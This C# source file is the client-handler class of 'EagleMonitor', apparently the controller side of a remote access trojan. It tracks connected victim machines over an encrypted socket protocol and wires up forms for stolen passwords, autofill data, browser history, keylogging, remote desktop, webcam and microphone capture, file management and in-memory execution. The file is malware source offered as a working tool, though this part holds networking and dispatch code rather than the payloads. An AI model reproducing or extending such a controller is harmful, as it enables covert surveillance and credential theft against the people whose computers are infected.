﻿using EagleMonitor.Forms;
using EagleMonitor.Utils;
using PacketLib;
using PacketLib.Packet;
using PacketLib.Utils;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Net.Sockets;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace EagleMonitor.Networking
{
    internal class ClientHandler : IDisposable
    {
        internal static Dictionary<string, ClientHandler> ClientHandlersList { get; set; }
        internal static int CurrentClientsNumber { get { return ClientHandlersList.Count; } }
        static ClientHandler() 
        {
            ClientHandlersList = new Dictionary<string, ClientHandler>();
        }

        internal static void SendPacketToMultipleClients(IPacket packet) 
        {
            foreach (DataGridViewRow dataGridViewRow in Program.mainForm.dataGridView1.SelectedRows)
            {
                string IP = dataGridViewRow.Cells[2].Value.ToString();
                ClientHandler.ClientHandlersList[IP].SendPacket(packet);
            }
        }

        internal delegate byte[] ReadDataAsync();
        internal delegate IPacket ReadPacketAsync(byte[] BufferPacket);
        internal delegate IPacket SendDataAsync(IPacket data);


        private readonly ReadDataAsync readDataAsync;
        private readonly ReadPacketAsync readPacketAsync;
        internal readonly SendDataAsync sendDataAsync;


        internal Socket socket { get; set; }
        internal string IP { get; set; }
        internal string HWID { get; set; }
        internal string fullName { get; set; }
        internal DataGridViewRow clientRow { get; set; }
        internal int serverPort { get; set; }
        internal string clientPath { get; set; }
        internal string clientStatus { get; set; }
        internal bool is64bitClient { get; set; }
        internal AudioHelpers audioHelper { get; set; }


        internal PasswordsForm passwordsForm { get; set; }
        internal FileManagerForm fileManagerForm { get; set; }
        internal ProcessManagerForm processManagerForm { get; set; }
        internal KeyloggerForm keyloggerForm { get; set; }
        internal MemoryExecutionForm memoryExecutionForm { get; set; }
        internal HistoryForm historyForm { get; set; }
        internal MiscellaneousForm miscellaneousForm { get; set; }
        internal RemoteDesktopForm remoteDesktopForm { get; set; }
        internal RemoteCameraForm remoteCameraForm { get; set; }
        internal InformationForm informationForm { get; set; }
        internal AutofillForm autofillForm { get; set; }
        internal KeywordsForm keywordsForm { get; set; }
        internal RemoteAudioForm remoteAudioForm { get; set; }
        internal ClientHandler(Socket sock, int port) 
        {
            readDataAsync = new ReadDataAsync(ReceiveData);
            readPacketAsync = new ReadPacketAsync(PacketParser);
            sendDataAsync = new SendDataAsync(SendData);

            this.socket = sock;
            this.IP = socket.RemoteEndPoint.ToString();
            this.serverPort = port;
            Receive();
        }

        internal void Receive()
        {
            try
            {
                if (socket != null)
                    readDataAsync.BeginInvoke(new AsyncCallback(EndDataRead), null);
                else
                    return;
            }
            catch (Exception)
            {
                this.Dispose();
            }
        }

        private byte[] ReceiveData()
        {
            try
            {
                int total = 0;
                int recv;
                byte[] header = new byte[5];
                socket.Poll(-1, SelectMode.SelectRead);
                recv = socket.Receive(header, 0, 5, 0);

                int size = BitConverter.ToInt32(new byte[4] { header[0], header[1], header[2], header[3] }, 0);
                PacketType packetType = (PacketType)header[4];
               
                int dataleft = size;
                byte[] data = new byte[size];
                while (total < size)
                {
                    recv = socket.Receive(data, total, dataleft, 0);
                    total += recv;
                    dataleft -= recv;
                }

                return data;
            }
            catch (Exception)
            {
                this.Dispose();
                return null;
            }
        }
        private void EndDataRead(IAsyncResult ar)
        {
            try
            {
                byte[] data = readDataAsync.EndInvoke(ar);


                if (data != null)//&& Connected)
                    readPacketAsync.BeginInvoke(data, new AsyncCallback(EndPacketRead), null);

                if(socket != null)  
                    Receive();
            }
            catch (Exception)
            {
                this.Dispose();
            }
        }

        
        private IPacket PacketParser(byte[] BufferPacket)
        {
            try
            {
                return BufferPacket.DeserializePacket(Utils.Miscellaneous.settings.key);//, out packetSize);
            }
            catch (Exception)
            {
                return null;
            }
        }
        private void EndPacketRead(IAsyncResult ar)
        {
            try
            {

                IPacket packet = readPacketAsync.EndInvoke(ar);

                if (packet != null)
                {
                    switch (packet.packetType)
                    {
                        case PacketType.KEYLOG_ON:
                            ClientHandler.ClientHandlersList[packet.baseIp].keyloggerForm.clientHandler = this;
                            //PacketHandler.packetParser.BeginInvoke(packet, this, new AsyncCallback(PacketHandler.Log), null);
                            new PacketHandler(packet, this);
                            break;

                        case PacketType.CONNECTED:
                            ClientHandler.ClientHandlersList.Add(this.IP, this);
                            //PacketHandler.packetParser.BeginInvoke(packet, this, new AsyncCallback(PacketHandler.Log), null);
                            new PacketHandler(packet, this);
                            break;

                        case PacketType.RM_VIEW_ON:
                            ClientHandler.ClientHandlersList[packet.baseIp].remoteDesktopForm.clientHandler = this;
                            new PacketHandler(packet, this);
                            //PacketHandler.packetParser.BeginInvoke(packet, this, new AsyncCallback(PacketHandler.Log), null);
                            break;

                        case PacketType.RC_CAPTURE_ON:
                            ClientHandler.ClientHandlersList[packet.baseIp].remoteCameraForm.clientHandler = this;
                            new PacketHandler(packet, this);
                            //PacketHandler.packetParser.BeginInvoke(packet, this, new AsyncCallback(PacketHandler.Log), null);
                            break;

                        case PacketType.AUDIO_RECORD_ON:
                            ClientHandler.ClientHandlersList[packet.baseIp].remoteAudioForm.clientHandler = this;
                            new PacketHandler(packet, this);
                            break;

                        default:
                            new PacketHandler(packet, ClientHandler.ClientHandlersList[packet.baseIp]);
                            //PacketHandler.packetParser.BeginInvoke(packet, ClientHandler.ClientHandlersList[packet.baseIp], new AsyncCallback(PacketHandler.Log), null);
                            this.Dispose();
                            break;
                    }
                }
            }
            catch (Exception)// ex)
            {
                //MessageBox.Show(ex.ToString());
                this.Dispose();
            }
        }


        internal void SendPacket(IPacket packet) 
        {
            packet.HWID = this.HWID;
            packet.baseIp = this.IP;
            sendDataAsync.BeginInvoke(packet, new AsyncCallback(SendDataCompleted), null);
        }
        private IPacket SendData(IPacket data)
        {
            try
            {
                byte[] encryptedData = data.SerializePacket(Utils.Miscellaneous.settings.key);
                lock (socket)
                {
                    int total = 0;
                    int size = encryptedData.Length;
                    int datalft = size;
                    byte[] header = new byte[5];
                    socket.Poll(-1, SelectMode.SelectWrite);

                    byte[] temp = BitConverter.GetBytes(size);

                    header[0] = temp[0];
                    header[1] = temp[1];
                    header[2] = temp[2];
                    header[3] = temp[3];
                    header[4] = (byte)data.packetType;

                    int sent = socket.Send(header);

                    while (total < size)
                    {
                        sent = socket.Send(encryptedData, total, size, SocketFlags.None);
                        total += sent;
                        datalft -= sent;
                    }
                    return data;
                }
            }
            catch { return null; }
        }
        private void SendDataCompleted(IAsyncResult ar)
        {
            IPacket packet = sendDataAsync.EndInvoke(ar);

            if (packet != null)
            {
                packet.status = "SENT";
                packet.datePacketStatus = DateTime.Now.ToString();
            }
            else 
            {
                packet.status = "NOT SENT";
            }
            Program.logForm.dataGridView1.BeginInvoke((MethodInvoker)(() =>
            {
                int rowId = Program.logForm.dataGridView1.Rows.Add();
                DataGridViewRow row = Program.logForm.dataGridView1.Rows[rowId];
                row.Cells["Column1"].Value = packet.HWID;
                row.Cells["Column2"].Value = packet.baseIp;
                row.Cells["Column3"].Value = packet.packetType.ToString();
                row.Cells["Column4"].Style.ForeColor = Color.FromArgb(66, 182, 245);
                row.Cells["Column4"].Value = packet.status;
                row.Cells["Column6"].Value = packet.datePacketStatus;

                switch (packet.packetType)
                {
                    case PacketType.FM_DOWNLOAD_FILE:
                        row.Cells["Column5"].Value = ((DownloadFilePacket)packet).fileName;
                        break;

                    case PacketType.FM_DELETE_FILE:
                        row.Cells["Column5"].Value = ((DeleteFilePacket)packet).path;
                        break;

                    case PacketType.FM_START_FILE:
                        row.Cells["Column5"].Value = ((StartFilePacket)packet).filePath;
                        break;

                    case PacketType.FM_GET_FILES_AND_DIRS:
                        row.Cells["Column5"].Value = ((FileManagerPacket)packet).path;
                        break;
                }

                if (packet.packetType == PacketType.RC_CAPTURE_OFF || packet.packetType == PacketType.AUDIO_RECORD_OFF || packet.packetType == PacketType.RM_VIEW_OFF)
                {
                    packet = null;
                    this.Dispose();
                }
            }));
        }

        public void Dispose()
        {
            /*if (socket != null)
            {
                MessageBox.Show("??");
                socket.Shutdown(SocketShutdown.Both);
                MessageBox.Show("???");
                socket.Close();
                MessageBox.Show("????");
                socket.Dispose();
                socket = null;
            }*/
            try
            {
                socket.Shutdown(SocketShutdown.Both);
                socket.Close();
                socket.Dispose();
                socket = null;
            }
            catch { }

            if (ClientHandlersList.ContainsKey(this.IP))
                ClientHandlersList.Remove(this.IP);

            if (this.clientRow != null) 
            {
                Program.mainForm.dataGridView1.BeginInvoke((MethodInvoker)(() =>
                {
                    Program.mainForm.dataGridView1.Rows.Remove(this.clientRow);
                }));

                Utils.Miscellaneous.CloseForm(passwordsForm);
                Utils.Miscellaneous.CloseForm(fileManagerForm);
                Utils.Miscellaneous.CloseForm(keyloggerForm);
                Utils.Miscellaneous.CloseForm(processManagerForm);
                Utils.Miscellaneous.CloseForm(memoryExecutionForm);
                Utils.Miscellaneous.CloseForm(historyForm);
                Utils.Miscellaneous.CloseForm(miscellaneousForm);
                Utils.Miscellaneous.CloseForm(remoteCameraForm);
                Utils.Miscellaneous.CloseForm(remoteDesktopForm);
                Utils.Miscellaneous.CloseForm(informationForm);
                Utils.Miscellaneous.CloseForm(remoteAudioForm);
            }
        }
    }
}
